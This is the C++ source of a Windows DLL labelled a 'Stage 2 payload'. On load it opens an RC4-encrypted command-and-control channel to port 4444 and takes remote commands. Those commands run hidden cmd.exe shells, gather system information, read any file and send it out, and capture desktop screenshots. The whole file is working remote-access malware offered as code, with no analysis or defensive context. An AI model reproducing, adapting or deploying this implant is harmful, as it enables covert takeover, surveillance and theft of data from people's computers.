// payload.cpp

#include <winsock2.h>
#include <windows.h>
#include <stdint.h>
#include <cstdio>
#include <string>
#include <vector>
#include <iostream>
#include <sstream>
#include <fstream>
#include <filesystem>
#include <lmcons.h>
#include <gdiplus.h>

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "gdiplus.lib")

#pragma pack(push, 1)
struct ProtocolHeader {
    uint8_t magic;
    uint8_t sender;
    uint16_t command;
    uint32_t data_length;
};
#pragma pack(pop)

#define MAGIC_BYTE 0x53
#define SENDER_DLL 0x02
#define CMD_DLL_HEARTBEAT 0x0002
#define CMD_EXEC_CMD 0x0003

static char g_rc4Key[64] = { 0 };
static int g_rc4KeyLen = 0;

typedef std::vector<std::string> STR_LIST;

std::string fnBase64Decode(const std::string& szInput)
{
    if (szInput.empty())
        return "";

    DWORD nDecodedLength = 0;
    CryptStringToBinaryA(szInput.c_str(), (DWORD)szInput.length(), CRYPT_STRING_BASE64, NULL, &nDecodedLength, NULL, NULL);
    if (nDecodedLength == 0)
        return "";

    std::vector<char> abDecoded(nDecodedLength);
    if (CryptStringToBinaryA(szInput.c_str(), (DWORD)szInput.length(), CRYPT_STRING_BASE64, (BYTE *)abDecoded.data(), &nDecodedLength, NULL, NULL))
        return std::string(abDecoded.data(), nDecodedLength);

    return "";
}

std::string fnBase64Encode(const std::string& szInput)
{
    static const char base64_chars[] = 
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz"
        "0123456789+/";

    int in_len = (int)szInput.length();
    if (in_len == 0)
        return "";

    std::string ret;
    int i = 0;
    int j = 0;
    unsigned char char_array_3[3];
    unsigned char char_array_4[4];
    const char* bytes_to_encode = szInput.data();

    while (in_len--) 
    {
        char_array_3[i++] = *(bytes_to_encode++);
        if (i == 3) {
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;

            for (i = 0; (i < 4); i++)
                ret += base64_chars[char_array_4[i]];
            i = 0;
        }
    }

    if (i)
    {
        for (j = i; j < 3; j++)
            char_array_3[j] = '\0';

        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
        char_array_4[3] = char_array_3[2] & 0x3f;

        for (j = 0; (j < i + 1); j++)
            ret += base64_chars[char_array_4[j]];

        while ((i++ < 3))
            ret += '=';
    }

    return ret;
}

STR_LIST fnDecapsulate(const std::string& szInput, char splitter = '|')
{
    STR_LIST abResult;
    if (szInput.empty())
        return abResult;

    std::stringstream ss(szInput);
    std::string token;

    while (std::getline(ss, token, splitter))
    {
        std::string szDecoded = fnBase64Decode(token);
        abResult.push_back(szDecoded);
    }

    return abResult;
}

void rc4_crypt_buf(const char* key, int key_len, char* data, int data_len)
{
    unsigned char S[256];
    for (int i = 0; i < 256; i++)
        S[i] = (unsigned char)i;

    int j = 0;
    for (int i = 0; i < 256; i++)
    {
        j = (j + S[i] + key[i % key_len]) % 256;
        unsigned char tmp = S[i]; S[i] = S[j]; S[j] = tmp;
    }

    int i = 0;
    j = 0;
    for (int n = 0; n < data_len; n++)
    {
        i = (i + 1) % 256;
        j = (j + S[i]) % 256;
        unsigned char tmp = S[i]; S[i] = S[j]; S[j] = tmp;
        data[n] ^= (char)S[(S[i] + S[j]) % 256];
    }
}

void fnSendEncryptedResponse(SOCKET s, const std::string& data, int(WINAPI *pSend)(SOCKET, const char*, int, int))
{
    std::string encrypted_output = data;
    if (!encrypted_output.empty() && g_rc4KeyLen > 0)
    {
        rc4_crypt_buf(g_rc4Key, g_rc4KeyLen, (char*)encrypted_output.data(), (int)encrypted_output.length());
    }

    uint32_t out_len = (uint32_t)encrypted_output.length();
    pSend(s, (char*)&out_len, 4, 0);
    pSend(s, encrypted_output.data(), out_len, 0);
}

void fnExecuteCommand(SOCKET s, const char* cmd, int(WINAPI *pSend)(SOCKET, const char*, int, int))
{
    char full_cmd[512];
    snprintf(full_cmd, sizeof(full_cmd), "cmd.exe /c %s", cmd);

    HANDLE hReadPipe, hWritePipe;
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };

    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0))
    {
        const char* err_msg = "[-] Failed to create pipe.";
        uint32_t len = (uint32_t)strlen(err_msg);
        pSend(s, (char*)&len, 4, 0);
        pSend(s, err_msg, len, 0);
        return;
    }

    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(STARTUPINFOA);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe;
    si.hStdInput = NULL;
    si.wShowWindow = SW_HIDE;

    if (CreateProcessA(NULL, full_cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
    {
        CloseHandle(hWritePipe);

        char buffer[4096];
        DWORD bytesRead;
        std::string output = "";

        while (ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0)
        {
            buffer[bytesRead] = '\0';
            output += buffer;
        }

        CloseHandle(hReadPipe);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        if (output.empty())
        {
            output = "[+] Command executed successfully (no output).\r\n";
        }

        fnSendEncryptedResponse(s, output, pSend);
    }
    else
    {
        CloseHandle(hReadPipe);
        CloseHandle(hWritePipe);
        
        fnSendEncryptedResponse(s, "[-] Failed to spawn process.", pSend);
    }
}

std::string fnGetSystemInfo()
{
    std::string szInfo = "";

    char szComputerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD nSize = sizeof(szComputerName);
    if (GetComputerNameA(szComputerName, &nSize))
        szInfo += "Computer Name: " + std::string(szComputerName) + "\r\n";
    else
        szInfo += "Computer Name: Unknown\r\n";

    char szUserName[UNLEN + 1];
    DWORD nUserSize = sizeof(szUserName);
    if (GetUserNameA(szUserName, &nUserSize))
        szInfo += "User Name: " + std::string(szUserName) + "\r\n";
    else
        szInfo += "User Name: Unknown\r\n";

    SYSTEM_INFO si;
    GetSystemInfo(&si);
    szInfo += "Architecture: ";
    switch (si.wProcessorArchitecture)
    {
        case PROCESSOR_ARCHITECTURE_AMD64:
            szInfo += "x64 (AMD64)\r\n";
            break;
        case PROCESSOR_ARCHITECTURE_INTEL:
            szInfo += "x86\r\n";
            break;
        case PROCESSOR_ARCHITECTURE_ARM64:
            szInfo += "ARM64\r\n";
            break;
        default:
            szInfo += "Unknown\r\n";
            break;
    }

    szInfo += "[+] Info gathered successfully.\r\n";

    return szInfo;
}

int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
{
    UINT num = 0;
    UINT size = 0;
    Gdiplus::GetImageEncodersSize(&num, &size);
    if (size == 0)
        return -1;

    auto pImageCodeInfo = (Gdiplus::ImageCodecInfo *)(malloc(size));
    if (!pImageCodeInfo)
        return -1;

    Gdiplus::GetImageEncoders(num, size, pImageCodeInfo);
    for (UINT j = 0; j < num; j++)
    {
        if (wcscmp(pImageCodeInfo[j].MimeType, format) == 0)
        {
            *pClsid = pImageCodeInfo[j].Clsid;
            free(pImageCodeInfo);

            return j;
        }
    }

    free(pImageCodeInfo);

    return -1;
}

std::string fnTakeScreenshot()
{
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    std::string szBase64Img = "";

    HWND hDesktopWnd = GetDesktopWindow();
    HDC hDesktopDC = GetDC(hDesktopWnd);
    HDC hCaptureDC = CreateCompatibleDC(hDesktopDC);

    int nWidth = GetSystemMetrics(SM_CXSCREEN);
    int nHeight = GetSystemMetrics(SM_CYSCREEN);

    HBITMAP hCaptureBitmap = CreateCompatibleBitmap(hDesktopDC, nWidth, nHeight);
    SelectObject(hCaptureDC, hCaptureBitmap);

    BitBlt(hCaptureDC, 0, 0, nWidth, nHeight, hDesktopDC, 0, 0, SRCCOPY | CAPTUREBLT);
    Gdiplus::Bitmap* bmp = Gdiplus::Bitmap::FromHBITMAP(hCaptureBitmap, NULL);

    if (bmp)
    {
        CLSID jpgClsid;
        if (GetEncoderClsid(L"image/jpeg", &jpgClsid) != -1)
        {
            IStream* pStream = NULL;
            if (CreateStreamOnHGlobal(NULL, TRUE, &pStream) == S_OK)
            {
                bmp->Save(pStream, &jpgClsid, NULL);

                HGLOBAL hGlobal = NULL;
                GetHGlobalFromStream(pStream, &hGlobal);
                if (hGlobal)
                {
                    DWORD nBufSize = (DWORD)GlobalSize(hGlobal);
                    LPVOID pData = GlobalLock(hGlobal);
                    if (pData && nBufSize > 0)
                    {
                        std::string rawImage((const char *)pData, nBufSize);
                        szBase64Img = fnBase64Encode(rawImage);
                        GlobalUnlock(hGlobal);
                    }
                }

                pStream->Release();
            }
        }

        delete bmp;
    }

    DeleteObject(hCaptureBitmap);
    DeleteDC(hCaptureDC);
    ReleaseDC(hDesktopWnd, hDesktopDC);

    Gdiplus::GdiplusShutdown(gdiplusToken);

    return szBase64Img;
}

DWORD WINAPI C2CommunicationThread(LPVOID lpParam)
{
    HMODULE hWs2 = LoadLibraryA("ws2_32.dll");
    if (!hWs2)
        return 0;

    auto pWSAStartup = (int(WINAPI*)(WORD, LPWSADATA))GetProcAddress(hWs2, "WSAStartup");
    auto pSocket = (SOCKET(WINAPI*)(int, int, int))GetProcAddress(hWs2, "socket");
    auto pConnect = (int(WINAPI*)(SOCKET, const sockaddr*, int))GetProcAddress(hWs2, "connect");
    auto pSend = (int(WINAPI*)(SOCKET, const char*, int, int))GetProcAddress(hWs2, "send");
    auto pRecv = (int(WINAPI*)(SOCKET, char*, int, int))GetProcAddress(hWs2, "recv");
    auto pCloseSocket = (int(WINAPI*)(SOCKET))GetProcAddress(hWs2, "closesocket");

    WSADATA wsaData;
    if (pWSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
        return 0;

    SOCKET s = pSocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET)
        return 0;

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(4444);
    serverAddr.sin_addr.s_addr = inet_addr("127.0.0.1");

    if (pConnect(s, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) != 0)
    {
        pCloseSocket(s);
        return 0;
    }

    ProtocolHeader pkt;
    pkt.magic = MAGIC_BYTE;
    pkt.sender = SENDER_DLL; 
    pkt.command = CMD_DLL_HEARTBEAT;
    pkt.data_length = 0;
    pSend(s, (char*)&pkt, sizeof(pkt), 0);

    while (true)
    {
        char header_buf[8];
        int totalReceived = 0;
        while (totalReceived < 8)
        {
            int r = pRecv(s, header_buf + totalReceived, 8 - totalReceived, 0);
            if (r <= 0)
                break;

            totalReceived += r;
        }

        if (totalReceived < 8)
            break;

        uint8_t magic = header_buf[0];
        uint8_t sender = header_buf[1];
        uint16_t command = *(uint16_t*)(header_buf + 2);
        uint32_t data_len = *(uint32_t*)(header_buf + 4);

        if (magic != MAGIC_BYTE || command != CMD_EXEC_CMD)
            break;

        char* cmd_buf = new char[data_len + 1];
        totalReceived = 0;
        while (totalReceived < (int)data_len)
        {
            int r = pRecv(s, cmd_buf + totalReceived, data_len - totalReceived, 0);
            if (r <= 0)
                break;

            totalReceived += r;
        }

        cmd_buf[data_len] = '\0';

        rc4_crypt_buf(g_rc4Key, g_rc4KeyLen, cmd_buf, data_len);

        STR_LIST ls = fnDecapsulate(cmd_buf);
        if (ls[0] == "info")
        {
            std::string szInfo = fnGetSystemInfo();
            fnSendEncryptedResponse(s, szInfo, pSend);
        }
        else if (ls[0] == "cmd")
        {
            if (ls[1] == "exec")
            {
                fnExecuteCommand(s, ls[2].c_str(), pSend);
            }
        }
        else if (ls[0] == "file")
        {
            if (ls[1] == "read")
            {
                std::string szFilePath = ls[2];
                DWORD attr = GetFileAttributesA(szFilePath.c_str());
                if (attr != INVALID_FILE_ATTRIBUTES && !(attr & FILE_ATTRIBUTE_DIRECTORY))
                {
                    std::ifstream file(szFilePath, std::ios::binary | std::ios::ate);
                    if (file.is_open())
                    {
                        std::streamsize fileSize = file.tellg();
                        file.seekg(0, std::ios::beg);

                        if (fileSize <= 0)
                        {
                            file.close();
                            return -1;
                        }

                        std::string fileContent;
                        fileContent.resize((size_t)fileSize);

                        if (file.read(&fileContent[0], fileSize))
                        {
                            std::string preview = fileContent.substr(0, 20);

                            file.close();

                            std::string szResult = fnBase64Encode(fileContent);

                            fnSendEncryptedResponse(s, szResult, pSend);
                        }
                        else
                        {
                            MessageBoxA(NULL, "File Read Failed!", "Error", MB_OK);
                            file.close();
                        }
                    }
                }
                else
                {
                    std::string szResult = "Invalid file:" + szFilePath;
                    fnSendEncryptedResponse(s, szResult, pSend);
                }
            }
        }
        else if (ls[0] == "screen")
        {
            std::string szResult = fnTakeScreenshot();
            if (!szResult.empty())
                fnSendEncryptedResponse(s, szResult, pSend);
            else
                fnSendEncryptedResponse(s, "[-] Failed to capture screenshot.", pSend);
        }
        else if (ls[0] == "webcam")
        {

        }
        else if (ls[0] == "exit")
        {
            break;
        }

        delete[] cmd_buf;
    }

    pCloseSocket(s);

    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    switch (fdwReason)
    {
        case DLL_PROCESS_ATTACH:
            MessageBoxA(NULL, "Stage 2 payload with RC4", "StummSchneide", MB_OK | MB_ICONINFORMATION);
            DisableThreadLibraryCalls(hinstDLL);

            if (lpvReserved != NULL)
            {
                char* keyPtr = (char*)lpvReserved;
                g_rc4KeyLen = (int)strlen(keyPtr);
                if (g_rc4KeyLen > 0 && g_rc4KeyLen < 64)
                {
                    memcpy(g_rc4Key, keyPtr, g_rc4KeyLen);
                }
            }
            
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)C2CommunicationThread, NULL, 0, NULL);

            break;
    }
    return TRUE;
}